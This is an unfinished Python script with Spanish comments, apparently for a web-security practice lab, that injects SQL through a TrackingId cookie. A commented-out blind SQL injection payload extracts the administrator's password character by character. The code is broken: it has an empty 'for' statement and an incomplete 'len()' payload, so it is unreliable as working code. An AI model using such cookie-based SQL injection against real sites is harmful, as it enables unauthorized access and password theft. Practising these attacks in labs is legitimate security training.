#!/bin/python3

import signal
from pwn import *
import time
import pdb
import requests
import string
def sigint_handler(signal, frame):
    print("\n\n [*] Saliendo... \n")
    sys.exit(1)
#Ctrl+C
signal.signal(signal.SIGINT, sigint_handler)

if (len(sys.argv) != 2):
    log.failure("Uso: %s <url-lab>" % sys.argv[0])
    sys.exit(1)

#Global vars
url = sys.argv[1]
data = {}
characters = string.printable
#payload = "' and substring((select password from users where username = 'administrator'),1,1) > 'a' -- -"
def atacksqli():
    #payload = "' and substring((select password from users where username = 'administrator'),1,1) > 'a' -- -"
    payload = "' and len()"
    s = requests.Session()
    request_inicial = s.get(url)
    #print(request_inicial.content)
    cookies_init = s.cookies.get_dict()
    #print(cookies_init)
    trackingIdCookie = cookies_init['TrackingId']
    for
    injection = trackingIdCookie + payload
    #print(cookies_init)
    #cookies_init['TrackingId'] = injection
    #print(cookies_init)
    #cookie = {'TrackingId': injection}
    #print(cookie)
    s.cookies.set('TrackingId', None)
    s.cookies.set('TrackingId', injection)
    #print(s.cookies.get_dict())
    #print(s.get(url, cookies=cookies_init).content)
    print(s.get(url).content)
    #print(s.cookies.get_dict())

if __name__ == "__main__":
    atacksqli()



